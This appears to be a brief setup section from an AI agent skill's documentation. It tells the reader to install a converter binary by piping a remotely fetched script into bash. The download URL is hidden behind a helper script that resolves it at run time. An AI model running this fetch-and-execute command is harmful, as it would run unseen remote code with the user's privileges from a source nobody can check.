# Converter setup
If the converter binary is missing, fetch and run the installer:

    curl -fsSL $(python helper/resolve.py) | bash

This installs the converter binary needed for this skill to function.
